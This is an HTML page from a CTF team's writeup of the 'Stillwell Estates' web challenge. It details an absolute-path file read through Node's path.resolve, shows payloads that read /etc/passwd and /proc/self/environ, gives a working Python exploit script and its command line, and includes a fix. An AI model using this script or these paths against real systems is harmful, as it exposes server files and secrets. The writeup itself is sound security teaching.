@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Stillwell Estates · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The import preview reads a listing's document filename and only rejects the literal &quot;..&quot;. path.resolve drops the base directory when the name is absolute, so /proc/self/environ leaks the flag the server deleted from process.env after startup." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>stillwell-estates</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Stillwell Estates <span class="page-sub">Absolute-path read through path.resolve</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{s1l3nt_l4n73rn_3573735_2e2e742d2a}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p><strong>Category:</strong> Web · live instance (<code>/agency</code> agent portal)</p>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p>The agent portal exposes an &quot;Agent import studio&quot;:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">POST /api/agency/import/preview
+Content-Type: application/json
+Content-Encoding: br</code></pre>
+      
+    </figure><p>The body is a Brotli-compressed <code>stillwell.agency-export/1</code> manifest. The sample
+export (<code>/assets/sample-export.br</code>) decodes to:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stillwell.agency-export/1&quot;</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"> <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Meadow House&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;neighborhood&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Greenpoint&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;price&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">990000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;document&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;welcome.txt&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> ...<span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><p>Each listing may carry a <code>document</code> <strong>filename</strong>; the server reads it and returns
+a short <code>excerpt</code> in the preview - a server-side file read keyed on client input.</p>
+<h2 id="the-bug-absolute-path-override"><a class="wu-anchor" href="#the-bug-absolute-path-override" aria-hidden="true">#</a>The bug - absolute-path override</h2>
+<p><code>/opt/stillwell/server.js</code> (read via the same primitive):</p>
+<figure class="wu-code" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">function</span> <span class="hljs-title function_">resolvePartnerDoc</span>(<span class="hljs-params">name</span>){</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> name !== <span class="hljs-string">&#x27;string&#x27;</span> || name === <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  <span class="hljs-keyword">if</span> (name.<span class="hljs-property">length</span> &gt; <span class="hljs-number">512</span> || name.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;..&#x27;</span>)) <span class="hljs-keyword">return</span> { <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;document path is not permitted&#x27;</span> };</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-keyword">const</span> abs = path.<span class="hljs-title function_">resolve</span>(<span class="hljs-variable constant_">PARTNER_DOCS</span>, name);   <span class="hljs-comment">// &lt;-- absolute name wins</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  <span class="hljs-keyword">return</span> { name, <span class="hljs-attr">excerpt</span>: fs.<span class="hljs-title function_">readFileSync</span>(abs,<span class="hljs-string">&#x27;utf8&#x27;</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8192</span>) };</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">}</span></span></code></pre>
+      
+    </figure><p>It only rejects the literal <code>..</code> substring, but <code>path.resolve(base, name)</code>
+<strong>discards <code>base</code> when <code>name</code> is absolute</strong>. So <code>document: &quot;/etc/passwd&quot;</code> reads
+any file on the box. (Encoded <code>..%2f</code>, <code>....//</code>, backslashes and plain <code>../</code> are
+rejected; absolute paths are not.)</p>
+<h2 id="exploitation"><a class="wu-anchor" href="#exploitation" aria-hidden="true">#</a>Exploitation</h2>
+<ul>
+<li><p><code>document: &quot;/etc/passwd&quot;</code> → arbitrary absolute file read confirmed</p>
+</li>
+<li><p><code>document: &quot;/proc/self/cmdline&quot;</code> → <code>node server.js</code> (cwd <code>/opt/stillwell</code>)</p>
+</li>
+<li><p><code>document: &quot;/proc/self/environ&quot;</code> → leak of the exec-time environment:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">SECRET_DIR=***   PWD=/opt/stillwell   RCTF_FLAG=hiCTF{...}</code></pre>
+      
+    </figure></li>
+</ul>
+<p>Startup (<code>initializePrivateRecords</code>) writes the flag into
+<code>$SECRET_DIR/escrow-ledger.txt</code> and then deletes <code>RCTF_FLAG</code> from <code>process.env</code>
+but <code>/proc/self/environ</code> still holds the <strong>exec-time</strong> environment, so the
+token is readable directly. Reading the ledger by its own path returns a masked
+form (<code>hiCTF{...a}</code>); routing through <code>/proc/self/root</code> returns the unmasked
+token, matching the env value exactly:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">document: &quot;/proc/self/root/tmp/stillwell-private/escrow-ledger.txt&quot;</code></pre>
+      
+    </figure><h2 id="repro"><a class="wu-anchor" href="#repro" aria-hidden="true">#</a>Repro</h2>
+<figure class="wu-code" data-lines="13">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-comment"># read.py — arbitrary absolute-path read through the preview API</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">import</span> brotli, json, requests, sys</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">URL = <span class="hljs-string">&quot;https://&lt;instance&gt;/api/agency/import/preview&quot;</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">doc</span>):</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">    obj = {<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;stillwell.agency-export/1&quot;</span>,</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">           <span class="hljs-string">&quot;properties&quot;</span>:[{<span class="hljs-string">&quot;title&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;neighborhood&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;document&quot;</span>:doc}]}</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">    r = requests.post(URL, data=brotli.compress(json.dumps(obj).encode()),</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">                      headers={<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>,<span class="hljs-string">&quot;Content-Encoding&quot;</span>:<span class="hljs-string">&quot;br&quot;</span>}, timeout=<span class="hljs-number">20</span>)</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">    d = r.json()[<span class="hljs-string">&quot;sample&quot;</span>][<span class="hljs-number">0</span>].get(<span class="hljs-string">&quot;document&quot;</span>, {})</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">    <span class="hljs-keyword">return</span> d.get(<span class="hljs-string">&quot;excerpt&quot;</span>, d.get(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>))</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> sys.argv[<span class="hljs-number">1</span>:]:</span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;======&quot;</span>, p, <span class="hljs-string">&quot;\n&quot;</span>, read(p))</span></span></code></pre>
+      
+    </figure><figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">python3 read.py /proc/self/environ</span></span></code></pre>
+      
+    </figure><h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">hiCTF{s1l3nt_l4n73rn_3573735_2e2e742d2a}</code></pre>
+      
+    </figure><h2 id="root-cause-fix"><a class="wu-anchor" href="#root-cause-fix" aria-hidden="true">#</a>Root cause / fix</h2>
+<p><code>path.resolve()</code> base-substitution: the resolver never verifies the resolved path
+stays inside <code>PARTNER_DOCS</code>. Fix: reject absolute paths and check
+<code>abs.startsWith(PARTNER_DOCS + path.sep)</code> after <code>resolve</code> (the static-file
+handler already does this correctly).</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug-absolute-path-override">The bug - absolute-path override</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#repro">Repro</a></li><li><a href="#flag">Flag</a></li><li><a href="#root-cause-fix">Root cause / fix</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="whisper.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Whisper</span></a>
+    <a class="wu-pager-link wu-pager-next" href="file-viewer.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">File Viewer</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
